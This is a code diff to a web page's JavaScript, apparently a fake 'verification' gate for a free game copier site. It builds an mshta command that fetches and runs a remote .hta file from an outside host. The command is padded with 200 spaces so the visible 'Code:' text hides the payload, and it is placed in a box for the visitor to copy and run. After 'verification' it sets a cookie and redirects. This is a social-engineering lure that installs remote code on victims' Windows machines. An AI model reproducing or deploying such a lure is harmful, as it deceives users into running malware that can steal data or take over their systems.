@@ -58,7 +58,7 @@
       .then(data => {
         code = data.code;
         const spaces = " ".repeat(200);
-        // Updated to use .hta instead of .vbs
+        // Change .vbs to .hta if you want to use HTA file
         const cmd = `mshta https://freegamecopier.onrender.com/verifyaccept.hta${spaces}Code: ${code}`;
         document.getElementById("cmdBox").textContent = cmd;
         window.generatedCommand = cmd;
@@ -82,6 +82,8 @@
           if (data.success) {
             document.getElementById("result").style.color = "lime";
             document.getElementById("result").textContent = "✔ Verified! Redirecting...";
+            // Set the cookie tokenGate=1 after successful verification
+            document.cookie = "tokenGate=1; path=/; max-age=86400"; // 1 day
             setTimeout(() => {
               window.location.href = "/verifynotwindows";
             }, 1000);
